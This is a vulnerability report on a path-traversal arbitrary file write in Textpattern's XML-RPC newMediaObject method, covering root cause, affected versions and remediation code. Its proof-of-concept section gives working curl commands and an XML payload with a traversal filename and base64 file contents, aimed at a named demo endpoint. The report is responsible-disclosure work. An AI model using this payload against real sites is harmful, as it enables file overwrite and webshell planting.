# Vulnerability Report: Textpattern XML-RPC Arbitrary File Write

## 1. Basic Information

- **Vulnerability Name:** `metaWeblog.newMediaObject` Arbitrary File Write (Potential RCE / File Overwrite)
- **Severity:** High
- **Recommended CVSS v3.1:** 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
- **Vulnerability Types:**
  - CWE-22: Path Traversal
  - CWE-73: External Control of File Name or Path
  - CWE-434: Unrestricted Upload of File with Dangerous Type

- **Discovery Date:** 2026-02-27
- **Test Target:** [https://dev-demo.textpattern.co/dev/rpc/](https://dev-demo.textpattern.co/dev/rpc/)
- My github: [https://github.com/LTX-GOD](https://github.com/LTX-GOD)

---

## 2. Affected Scope

- **Confirmed vulnerable code:**
  `rpc/TXP_RPCServer.php:914` (around `mt_uploadImage()`)

- **Current repository version:**
  `textpattern/lib/constants.php:32` indicates `5.0.0-dev`, confirmed vulnerable.

- **Version 4.9.1:**
  The same implementation exists in tag `4.9.1` (`rpc/TXP_RPCServer.php`, verified via local `git show`).

- **Introduction point:**
  `metaWeblog.newMediaObject` was introduced in 4.9.0 (`HISTORY.txt:108`).
  Therefore, **versions 4.9.0 and later should be considered affected**.

- **Default configuration:**
  XML-RPC is disabled by default (`core.prefs:113`), but once enabled, the vulnerability becomes exploitable.

---

## 3. Root Cause Analysis

1. The method `mt_uploadImage()` directly concatenates user-controlled `file.name` into a filesystem path before writing the file:
   - `rpc/TXP_RPCServer.php:924–925`

2. No sanitization is performed (e.g., no `basename()` or `sanitizeForFile()`), allowing path traversal such as `../`.

3. The XML-RPC layer automatically decodes `<base64>` content into raw bytes:
   - `IXRClass.php:329–330`

   This enables attackers to write arbitrary file contents.

4. The subsequent `image_data()` call is only intended for image validation/processing.
   If the file is not a valid image, it returns an error string:
   - `txplib_admin.php:390–392`

   However, the file has already been written at this point.

5. The caller does not validate the return type of `image_data()` and directly accesses index `[1]`:
   - `rpc/TXP_RPCServer.php:933`

   This may produce an exception response but does **not** undo the file write.

6. The method only verifies that the user is logged in:
   - `rpc/TXP_RPCServer.php:918–921`

   It does **not** enforce specific image-related privileges.

---

## 4. Impact and Exploitation Conditions

### Exploitation Requirements

- XML-RPC must be enabled.
- Attacker must possess any valid backend account (`privs > 0`).

### Impact

- Arbitrary file write to attacker-controlled paths.
- File overwrite of existing files.
- Potential webshell deployment (depending on write location and execution permissions).
- Data leakage, site compromise, or service disruption (if critical files are overwritten).

---

## 5. Proof of Concept (Authorized Environment Only)

### Step 1: Confirm XML-RPC Endpoint

```bash
curl -ksS -i 'https://dev-demo.textpattern.co/dev/rpc/' | head -n 20
```

### Step 2: Send `metaWeblog.newMediaObject` Request

```bash
cat > /tmp/txp_poc.xml <<'EOF'
<?xml version="1.0"?>
<methodCall>
  <methodName>metaWeblog.newMediaObject</methodName>
  <params>
    <param><value><string>default</string></value></param>
    <param><value><string>managing-editor622</string></value></param>
    <param><value><string>managing-editor622</string></value></param>
    <param>
      <value>
        <struct>
          <member>
            <name>name</name>
            <value>
              <string>/../../../../proc/self/cwd/../images/poc_test.txt</string>
            </value>
          </member>
          <member>
            <name>type</name>
            <value><string>text/plain</string></value>
          </member>
          <member>
            <name>bits</name>
            <value>
              <base64>UE9DX1RYUF9BUkJJVFJBUllfV1JJVEVfMjAyNjAyMjc=</base64>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>
EOF

curl -ksS 'https://dev-demo.textpattern.co/dev/rpc/' \
  -H 'Content-Type: text/xml' \
  --data-binary @/tmp/txp_poc.xml
```

### Verification

- A successful response contains a `<methodResponse>` with a `url` field.
- In testing, the demo environment returned `/images/n.txt`.

Note: The demo environment may undergo resets or rebuilds, and public static file access may not always be stable. However, the request flow reaches the vulnerable function and triggers the faulty branch, confirming exploitability.

---

## 6. Recommended Remediation

### 1. Enforce Safe File Names

```php
$safeName = sanitizeForFile(basename($file['name']));
```

### 2. Avoid Direct Path Concatenation

Use secure temporary files instead:

```php
$tmp = tempnam(rtrim(get_pref('tempdir', sys_get_temp_dir()), DS), 'rpc_');
```

### 3. Strict Base64 Validation

```php
$raw = base64_decode($file['bits'], true);
if ($raw === false) {
    return new IXR_Error(...);
}
```

### 4. Validate Image Processing Result

After writing the file:

- Strictly verify `image_data()` return type.
- If validation fails, immediately delete the temporary file and return an error.

### 5. Enforce Proper Authorization

In addition to login verification, require explicit privileges:

```php
has_privs('image.edit.own', $txp->txp_user)
```

or higher-level image upload permissions.

### 6. Restrict Size and Type

- Enforce maximum upload size limits.
- Validate MIME type and file signature (whitelist-based).
- Validate both before and after write operations.

### 7. Temporary Mitigation

Until a patch is released:

```
enable_xmlrpc_server = 0
```

Disable XML-RPC to eliminate exposure.

## Now

I have already obtained acknowledgment of this vulnerability from the development team.

![image](./attachments/260227-213528.avif)
